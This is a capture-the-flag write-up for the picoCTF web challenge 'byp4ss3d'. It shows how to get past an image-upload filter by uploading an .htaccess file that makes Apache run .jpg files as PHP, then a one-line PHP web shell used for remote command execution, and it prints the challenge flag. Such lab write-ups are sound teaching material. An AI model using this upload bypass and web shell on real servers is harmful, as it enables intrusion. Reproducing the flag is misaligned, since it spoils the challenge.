🚩 picoCTF – byp4ss3d
Challenge Information

CTF: picoCTF

Category: Web Exploitation

Difficulty: Medium

📜 Challenge Description

A university registration portal allows students to upload images of their ID cards for verification. The developer implemented filters to only allow image uploads.

The goal is to analyze the upload mechanism and determine whether these restrictions can be bypassed to interact with the server.

🔍 Analysis

The application restricts uploads to image extensions and blocks direct uploads of .php files.

However, the server runs Apache HTTP Server, which allows directory-level configuration using .htaccess.

If a .htaccess file is uploaded, it can redefine how Apache handles file extensions inside that directory.

⚡ Exploitation
1️⃣ Upload .htaccess

Create a .htaccess file containing:

AddType application/x-httpd-php .jpg

This directive forces Apache to interpret .jpg files as PHP scripts.

2️⃣ Upload Web Shell

Upload a file named shell.jpg containing:

<?php system($_GET['cmd']); ?>

The uploaded file is stored at:

/images/shell.jpg
3️⃣ Achieve Command Execution

Commands can now be executed using the cmd parameter:

/images/shell.jpg?cmd=whoami

This confirms that the server is executing commands.

4️⃣ Locate the Flag

Search the system for the flag file:

/images/shell.jpg?cmd=find / -name flag*

Result:

/var/www/flag.txt
5️⃣ Retrieve the Flag

Read the flag file:

/images/shell.jpg?cmd=cat /var/www/flag.txt
🏁 Flag
picoCTF{s3rv3r_byp4ss_0c257942}
🧠 Conclusion

The vulnerability occurred due to improper file upload validation and the ability to upload .htaccess files. By redefining how Apache handles .jpg files, it was possible to execute arbitrary PHP code and gain remote command execution on the server.
